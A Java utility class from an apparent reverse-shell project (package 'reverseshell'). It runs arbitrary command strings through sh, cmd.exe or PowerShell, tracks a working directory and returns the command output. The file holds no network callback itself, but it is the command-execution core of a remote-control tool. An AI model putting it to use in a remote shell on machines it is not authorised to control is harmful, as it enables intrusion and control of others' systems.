package com.mtattab.reverseshell.util;

import lombok.Cleanup;
import lombok.experimental.UtilityClass;
import lombok.extern.java.Log;

import java.io.*;
import java.util.ArrayList;
import java.util.List;

import java.util.concurrent.TimeUnit;

@UtilityClass
@Log
public class SystemCommandProxyUtil {

    private static boolean isWindows = System.getProperty("os.name").toLowerCase().startsWith("windows");
    private static boolean runPowerShell = false;

    private static File currentWorkingDir = new File(System.getProperty("user.dir"));


    public static void main(String[] args)  {
        // Where we want to execute
        System.out.println(runCommand( "cd c:/")); // For Windows users list files

        System.out.println(runCommand( "pwd")); // For Windows users list files
        System.out.println(runCommand( "powershell")); // For Windows users list files
        System.out.println(runCommand( "pwd")); // For Windows users list files

        System.out.println(runCommand( "cd ..")); // For Windows users list files
        System.out.println(runCommand( "dir")); // For Windows users list files


    }
    public String changeDirectory(String path) {
        File relativeDirectory = new File(currentWorkingDir, path);
        File absoluteDirectory = new File(path);


        if (relativeDirectory.exists() && relativeDirectory.isDirectory()) {
            currentWorkingDir = relativeDirectory;
            return "Directory changed successfuly";
        } else if (absoluteDirectory.exists() && absoluteDirectory.isDirectory()) {
            currentWorkingDir = absoluteDirectory;
            return "Directory changed successfuly";
        } else {

            return "Directory not found: " + path;
        }
    }

    public static String runCommand( String command)  {
        List<String> commands = new ArrayList<>( DataManipulationUtil.stringToList(command, " "));
//        edge cases
        if (commands.get(0).equalsIgnoreCase("cd")){
            commands.remove(0);
            return changeDirectory(String.join(" ", commands));
        } else if (isWindows && togglePowerShell(command) != null) {
            return "Switched to powershell successfuly";
        }


        StringBuilder output = new StringBuilder();
        runOsCommand(output, command);

        return output.toString();

    }
    public static void runOsCommand(StringBuilder output,String command){
        output.append("Running in: " + currentWorkingDir);
        output.append("\n");
        output.append("Command: " + command);
        output.append("\n");

        try {
            ProcessBuilder builder = new ProcessBuilder();
            builder.directory(currentWorkingDir);

            checkOSForCommand(builder,command);

            Process process = builder.start();

            @Cleanup
            OutputStream outputStream = process.getOutputStream();

            @Cleanup
            InputStream inputStream = process.getInputStream();

            @Cleanup
            InputStream errorStream = process.getErrorStream();

            output.append(printStream(inputStream));
            output.append("\n");

            output.append(printStream(errorStream));
            output.append("\n");

            boolean isFinished = process.waitFor(60, TimeUnit.SECONDS);



            if(!isFinished) {
                process.destroyForcibly();
            }

        }catch (Exception e){
            e.printStackTrace();
        }
    }

    public static void checkOSForCommand( ProcessBuilder builder, String command){
        List<String> commands = new ArrayList<>();

        if(isWindows) {
            setWindowPrompt(commands);
        }else {
            // Use a Unix shell to run the command on non-Windows systems
            commands.add("sh");
            commands.add("-c");

        }

        commands.addAll(DataManipulationUtil.stringToList(command, " "));
        builder.command(commands);
    }



    public static void setWindowPrompt(List<String> commands){
        if (runPowerShell){
            commands.add("powershell");
            commands.add("-Command");
        }else {
            commands.add("cmd.exe");
            commands.add("/c");
        }

    }

    private static String togglePowerShell(String commands){
        if (commands.toLowerCase().contains("powershell")){
            runPowerShell= !runPowerShell;
            return "Switched to Powershell mode";

        }
        return null;
    }

    private static String printStream(InputStream inputStream) throws IOException {
        StringBuilder output = new StringBuilder();
        try(BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream))) {
            String line;
            while((line = bufferedReader.readLine()) != null) {
                output.append(line);
                output.append("\n");

            }

        }
        return output.toString();
    }
}
